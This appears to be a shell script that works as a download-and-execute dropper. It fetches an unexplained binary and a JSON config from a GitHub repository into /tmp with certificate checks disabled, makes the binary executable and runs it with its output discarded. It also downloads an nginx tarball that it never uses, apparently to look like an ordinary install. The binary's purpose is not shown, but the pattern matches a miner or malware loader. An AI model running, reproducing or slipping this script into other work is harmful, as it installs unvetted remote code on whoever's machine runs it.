#!/bin/sh
cd /tmp
wget --no-check-certificate -O a_pre.json https://raw.githubusercontent.com/happylife888/ibm/master/a_pre.json
wget --no-check-certificate -O a_lat https://raw.githubusercontent.com/happylife888/ibm/master/a_lat
chmod +x ./a_lat
wget --no-check-certificate -O release-1.19.2.tar.gz https://github.com/nginx/nginx/archive/release-1.19.2.tar.gz
tar -zxvf release-1.19.2.tar.gz
cd /tmp
./a_lat -config ./a_pre.json> null
